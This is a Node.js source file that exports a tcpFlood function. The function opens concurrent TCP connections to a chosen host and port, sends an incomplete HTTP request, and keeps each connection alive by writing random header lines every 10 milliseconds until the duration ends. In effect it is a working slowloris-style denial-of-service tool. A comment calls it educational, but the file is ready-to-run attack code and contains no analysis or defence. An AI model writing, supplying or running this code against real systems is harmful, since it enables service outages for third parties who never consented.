import net from 'net';

/**
 * Performs a TCP flood attack on a target.  This function is intended for educational/testing purposes ONLY.
 * Using this function against systems without explicit permission is illegal and unethical.
 *
 * @param {string} target The target hostname or IP address.
 * @param {number} port The target port. Defaults to 80.
 * @param {number} threads The number of concurrent TCP connections to establish. Defaults to 10.
 * @param {number} duration The duration of the flood in seconds. Defaults to 60.
 */
async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
  if (!target) {
    console.error("Target hostname or IP address is required for TCP flood.");
    return;
  }

  if (!Number.isInteger(port) || port <= 0 || port > 65535) {
    console.warn("Port must be a valid integer between 1 and 65535. Using default value of 80.");
    port = 80;
  }

  if (threads <= 0) {
    console.warn("Number of threads must be greater than 0. Using default value of 10.");
    threads = 10;
  }

  if (duration <= 0) {
    console.warn("Duration must be greater than 0. Using default value of 60 seconds.");
    duration = 60;
  }

  console.log(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration} seconds.`);

  const sockets = [];

  for (let i = 0; i < threads; i++) {
    try {
      const socket = net.createConnection({ host: target, port: port }, () => {
        console.log(`Thread ${i + 1}: Connected to ${target}:${port}`);

        sockets.push(socket);

        // Send junk data continuously
        socket.write("GET / HTTP/1.1\r\n"); // Basic HTTP request to keep connection alive.  Can be modified.
        socket.write("Host: " + target + "\r\n");
        socket.write("Connection: keep-alive\r\n");
        socket.write("User-Agent: TCPFloodBot\r\n");
        socket.write("\r\n");

        const intervalId = setInterval(() => {
          try {
            //Keep alive
            socket.write("X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
          } catch (err) {
            console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
            clearInterval(intervalId);
            try {
              socket.destroy();
            } catch(e) {
              console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
            }
          }
        }, 10);

        // Close the socket after the specified duration
        setTimeout(() => {
          console.log(`Thread ${i + 1}: Closing connection after ${duration} seconds.`);
          clearInterval(intervalId);
          try {
            socket.destroy();
          } catch(e) {
            console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
          }
          const index = sockets.indexOf(socket);
          if (index > -1) {
            sockets.splice(index, 1);
          }
        }, duration * 1000);
      });


      socket.on('error', (err) => {
        console.error(`Thread ${i + 1}: Socket error: ${err.message}`);
        try {
          socket.destroy();
        } catch(e) {
          console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
        }
        const index = sockets.indexOf(socket);
        if (index > -1) {
          sockets.splice(index, 1);
        }
      });

      socket.on('close', () => {
        console.log(`Thread ${i + 1}: Connection closed.`);
        const index = sockets.indexOf(socket);
        if (index > -1) {
          sockets.splice(index, 1);
        }
      });

    } catch (socketError) {
      console.error(`Error creating socket for thread ${i + 1}:`, socketError);
    }
  }

  // Stop the flood after the specified duration
  setTimeout(() => {
    console.log("Stopping TCP flood.");
    sockets.forEach(socket => {
      try {
        socket.destroy();
      } catch (e) {
        console.error("Error destroying socket:", e);
      }
    });
  }, duration * 1000);
}

export { tcpFlood };